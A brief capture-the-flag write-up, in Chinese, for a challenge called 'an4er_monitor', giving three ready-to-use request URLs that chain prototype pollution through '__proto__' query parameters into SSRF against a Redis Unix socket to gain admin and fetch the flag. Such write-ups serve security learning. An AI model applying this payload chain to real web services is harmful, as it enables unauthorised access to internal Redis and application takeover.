---
tags: [原型链污染, SSRF, Redis利用, Unix Domain Socket, RCE]
---

# an4er_monitor

(/api/server/import) prototype pollution → [http get](httpget)→ ssrf redis → flag redis开了unix socket unixsocket /run/redis/redis.sock

三个请求

```
http://61.147.171.105:65038/api/server/import?
__proto__.method=SET&__proto__.socketPath=/run/redis/redis.sock&hostname=0.0.0.0
http://61.147.171.105:65038/api/server/check?hostname=0.0.0.0&path=IsAdminSession
http://61.147.171.105:65038/api/server/getflag
```

